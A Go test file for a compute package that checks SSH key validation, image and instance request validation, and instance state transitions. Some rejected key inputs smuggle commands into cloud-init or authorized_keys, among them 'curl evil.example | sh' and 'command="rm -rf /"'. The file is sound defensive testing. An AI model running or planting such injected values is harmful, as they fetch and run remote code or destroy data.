package compute

import (
	"errors"
	"strings"
	"testing"
	"time"
)

const goodKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl"

func ptr[T any](v T) *T { return &v }

func TestSSHKeys(t *testing.T) {
	for name, key := range map[string]string{
		"ed25519":               goodKey,
		"with a comment":        goodKey + " user@host",
		"with a dotted comment": goodKey + " leo.n_laptop-2026+a=b/c",
		"rsa":                   "ssh-rsa " + strings.Repeat("AAAAB3NzaC1yc2E", 50) + "== me@laptop",
		"ecdsa":                 "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTY=",
		"a security key":        "sk-ssh-ed25519@openssh.com AAAAGnNrLXNzaC1lZDI1NTE5QG9wZW5zc2guY29tAAAAI",
	} {
		if !ValidSSHKey(key) {
			t.Errorf("%s was refused: %q", name, key)
		}
	}

	// Each of these is one line of cloud-init that does something else than authorize a key: the composition writes the keys
	// with a plain printf, so what is refused here is the only protection.
	for name, key := range map[string]string{
		"empty":                       "",
		"a line break and a command":  goodKey + "\nruncmd:\n  - curl evil.example | sh",
		"a line break at the end":     goodKey + "\n",
		"a carriage return":           goodKey + "\r",
		"a second key":                goodKey + "\n  - " + goodKey,
		"a comment that is a mapping": goodKey + " a: b",
		"a comment with a #":          goodKey + " a #b",
		"a comment of two words":      goodKey + " my laptop",
		"a quote in the comment":      goodKey + ` "a`,
		"a brace in the comment":      goodKey + " {a",
		"a tab":                       goodKey + "\tuser",
		"a space before":              " " + goodKey,
		"a space after":               goodKey + " ",
		"two spaces":                  goodKey + "  user",
		"a type that does not exist":  "ssh-foo AAAAC3NzaC1lZDI1NTE5AAAAIOMq",
		"options before the key":      `command="rm -rf /" ` + goodKey,
		"no key":                      "ssh-ed25519",
		"a key that is not base64":    "ssh-ed25519 not*base64*at*all*!!",
		"a key too short":             "ssh-ed25519 AAAA",
		"a comment too long":          goodKey + " " + strings.Repeat("a", 101),
		"a key too long":              "ssh-rsa " + strings.Repeat("A", 5000),
		"a unicode comment":           goodKey + " léo",
		"a yaml anchor":               goodKey + " &a",
	} {
		if ValidSSHKey(key) {
			t.Errorf("%s was accepted: %q", name, key)
		}
	}
}

func TestCreateImage(t *testing.T) {
	good := CreateImage{Name: "debian", Source: ImageSource{Name: "debian/13/cloud"}, Aliases: []string{"deb", "debian-13"}}
	if err := good.Validate(); err != nil {
		t.Fatal(err)
	}
	if err := (CreateImage{Name: "a", Source: ImageSource{Name: "alpine/3.22", Remote: "images"}}).Validate(); err != nil {
		t.Errorf("the images remote and no alias: %v", err)
	}

	for name, req := range map[string]CreateImage{
		"no name":                    {Source: ImageSource{Name: "debian/13/cloud"}},
		"an upper case name":         {Name: "Debian", Source: ImageSource{Name: "debian/13/cloud"}},
		"a name that ends with -":    {Name: "deb-", Source: ImageSource{Name: "debian/13/cloud"}},
		"a name of 64 characters":    {Name: strings.Repeat("a", 64), Source: ImageSource{Name: "debian/13/cloud"}},
		"no source":                  {Name: "debian"},
		"a source with a space":      {Name: "debian", Source: ImageSource{Name: "debian 13"}},
		"a source with a line break": {Name: "debian", Source: ImageSource{Name: "debian\nx"}},
		"a source with a quote":      {Name: "debian", Source: ImageSource{Name: `deb"ian`}},
		"another remote":             {Name: "debian", Source: ImageSource{Name: "debian/13/cloud", Remote: "evil"}},
		"an alias in capitals":       {Name: "debian", Source: ImageSource{Name: "debian/13/cloud"}, Aliases: []string{"Deb"}},
		"an alias twice":             {Name: "debian", Source: ImageSource{Name: "debian/13/cloud"}, Aliases: []string{"deb", "deb"}},
		"eleven aliases":             {Name: "debian", Source: ImageSource{Name: "debian/13/cloud"}, Aliases: strings.Split("a b c d e f g h i j k", " ")},
	} {
		t.Run(name, func(t *testing.T) {
			var invalid *InvalidError
			if err := req.Validate(); !errors.As(err, &invalid) {
				t.Errorf("accepted: %v", err)
			}
		})
	}
}

func TestCreateInstance(t *testing.T) {
	if err := (CreateInstance{Name: "web", Image: "debian"}).Validate(); err != nil {
		t.Errorf("a name and an image are enough: %v", err)
	}
	full := CreateInstance{
		Name: "web-1", Image: "debian", CPU: ptr(16), MemoryMiB: ptr(65536), DiskGiB: ptr(500),
		Running: ptr(false), Nesting: ptr(true), SecureBoot: ptr(false), SSHPublicKeys: []string{goodKey},
	}
	if err := full.Validate(); err != nil {
		t.Errorf("the upper bounds: %v", err)
	}
	if err := (CreateInstance{Name: "web", Image: "debian", CPU: ptr(1), MemoryMiB: ptr(256), DiskGiB: ptr(1)}).Validate(); err != nil {
		t.Errorf("the lower bounds: %v", err)
	}

	for name, req := range map[string]CreateInstance{
		"no name":                         {Image: "debian"},
		"a name that starts with a digit": {Name: "1web", Image: "debian"},
		"an upper case name":              {Name: "Web", Image: "debian"},
		"a name that ends with -":         {Name: "web-", Image: "debian"},
		"a name of 64 characters":         {Name: "a" + strings.Repeat("b", 63), Image: "debian"},
		"no image":                        {Name: "web"},
		"an image that is a path":         {Name: "web", Image: "../debian"},
		"no cpu":                          {Name: "web", Image: "debian", CPU: ptr(0)},
		"17 cpus":                         {Name: "web", Image: "debian", CPU: ptr(17)},
		"255 MiB":                         {Name: "web", Image: "debian", MemoryMiB: ptr(255)},
		"65537 MiB":                       {Name: "web", Image: "debian", MemoryMiB: ptr(65537)},
		"no disk":                         {Name: "web", Image: "debian", DiskGiB: ptr(0)},
		"501 GiB":                         {Name: "web", Image: "debian", DiskGiB: ptr(501)},
		"a bad key":                       {Name: "web", Image: "debian", SSHPublicKeys: []string{goodKey + "\nruncmd: x"}},
		"the same key twice":              {Name: "web", Image: "debian", SSHPublicKeys: []string{goodKey, goodKey}},
		"21 keys":                         {Name: "web", Image: "debian", SSHPublicKeys: manyKeys(21)},
	} {
		t.Run(name, func(t *testing.T) {
			var invalid *InvalidError
			if err := req.Validate(); !errors.As(err, &invalid) {
				t.Errorf("accepted: %v", err)
			}
		})
	}

	var invalid *InvalidError
	err := CreateInstance{Name: "1", Image: "", CPU: ptr(99)}.Validate()
	if !errors.As(err, &invalid) || len(invalid.Problems) != 3 {
		t.Errorf("every problem is reported at once: %v", err)
	}
}

func manyKeys(n int) []string {
	keys := make([]string, n)
	for i := range keys {
		keys[i] = goodKey + " k" + strings.Repeat("a", i)
	}
	return keys
}

func TestPatchInstance(t *testing.T) {
	empty := []string{}
	for name, ok := range map[string]PatchInstance{
		"stop":         {Running: ptr(false)},
		"resize":       {CPU: ptr(4), MemoryMiB: ptr(2048), DiskGiB: ptr(20)},
		"clear keys":   {SSHPublicKeys: &empty},
		"replace keys": {SSHPublicKeys: &[]string{goodKey}},
	} {
		if err := ok.Validate(); err != nil {
			t.Errorf("%s: %v", name, err)
		}
	}
	bad := []string{"nope"}
	for name, req := range map[string]PatchInstance{
		"nothing":       {},
		"too many cpus": {CPU: ptr(32)},
		"a bad key":     {SSHPublicKeys: &bad},
	} {
		if err := req.Validate(); err == nil {
			t.Errorf("%s was accepted", name)
		}
	}
}

func TestAnInstanceThatWasJustStartedIsStarting(t *testing.T) {
	t0 := time.Date(2026, 10, 27, 12, 0, 0, 0, time.UTC)
	for name, tt := range map[string]struct {
		in   Instance
		want time.Time
	}{
		"just created":                               {Instance{Running: true, CreatedAt: t0}, t0.Add(SettleTime)},
		"started after its creation":                 {Instance{Running: true, CreatedAt: t0.Add(-time.Hour), StartedAt: t0}, t0.Add(SettleTime)},
		"a start older than its creation is ignored": {Instance{Running: true, CreatedAt: t0, StartedAt: t0.Add(-time.Hour)}, t0.Add(SettleTime)},
		"not meant to run":                           {Instance{Running: false, CreatedAt: t0, StartedAt: t0}, time.Time{}},
	} {
		if got := tt.in.StartingUntil(); !got.Equal(tt.want) {
			t.Errorf("%s: %v, want %v", name, got, tt.want)
		}
	}
}

func TestTransition(t *testing.T) {
	for name, tt := range map[string]struct {
		in   Instance
		want string
	}{
		"running as asked":             {Instance{Running: true, State: "Running"}, ""},
		"stopped as asked":             {Instance{Running: false, State: "Stopped"}, ""},
		"asked to run, still stopped":  {Instance{Running: true, State: "Stopped"}, Starting},
		"asked to stop, still running": {Instance{Running: false, State: "Running"}, Stopping},
		"not created yet":              {Instance{Running: true, State: ""}, ""},
		"frozen is not a transition":   {Instance{Running: true, State: "Frozen"}, ""},
		"an error is not a transition": {Instance{Running: false, State: "Error"}, ""},
	} {
		if got := tt.in.Transition(); got != tt.want {
			t.Errorf("%s: %q, want %q", name, got, tt.want)
		}
	}
}

func TestStuckFor(t *testing.T) {
	now := time.Date(2026, 10, 27, 12, 0, 0, 0, time.UTC)
	stopping := func(since time.Time) Instance {
		return Instance{Running: false, State: "Running", OperationSince: since}
	}
	if got := stopping(now.Add(-StuckAfter + time.Second)).StuckFor(now); got != 0 {
		t.Errorf("just under the limit: %v", got)
	}
	if got := stopping(now.Add(-12 * time.Minute)).StuckFor(now); got != 12*time.Minute {
		t.Errorf("12 minutes: %v", got)
	}
	if got := stopping(time.Time{}).StuckFor(now); got != 0 {
		t.Errorf("an unknown start is never stuck: %v", got)
	}
	if got := (Instance{Running: true, State: "Running", OperationSince: now.Add(-time.Hour)}).StuckFor(now); got != 0 {
		t.Errorf("not in transition: %v", got)
	}
}
